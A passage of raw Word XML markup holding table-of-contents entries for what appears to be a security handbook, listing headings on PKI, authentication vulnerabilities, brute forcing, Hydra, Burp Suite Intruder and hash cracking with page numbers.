            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408548 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1336D9CC" w14:textId="3EA0F19D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408549" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Best Practices</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408549 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3A4E22FA" w14:textId="2982837A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408550" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Part III – Authentication &amp; Access Control</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408550 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="62A0AFAE" w14:textId="402313A8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408551" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Public Key Infrastructure (PKI)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408551 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="49807E67" w14:textId="0C1CC28C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408552" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>PKI Ensures</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408552 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="617E073D" w14:textId="727C76F6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408553" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Core Components of PKI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408553 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3AE8967D" w14:textId="34299EAF" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408554" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How Certificates Work</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408554 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="07E1FF66" w14:textId="531AE435" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408555" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>PKI Vulnerabilities</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408555 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="040F9232" w14:textId="40B7F04B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408556" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Authentication Vulnerabilities</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408556 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="64684D19" w14:textId="31CA94B1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408557" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Part IV – Attacks &amp; Exploits</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408557 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1062961F" w14:textId="63D58C0B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408558" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Brute Forcing</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408558 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3125D52A" w14:textId="15ADEE47" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408559" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Variants</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408559 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="136F850D" w14:textId="6CEC3D44" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408560" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How to Attack</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408560 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="38500091" w14:textId="53807F34" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408561" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408561 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="70328108" w14:textId="303CC764" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408562" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Hydra</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408562 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5C8CFF40" w14:textId="4D60A2C0" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408563" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Burp Suite Intruder</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408563 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="282910F2" w14:textId="1D808597" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408564" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Hash Cracking</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408564 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r>
              <w:rPr>
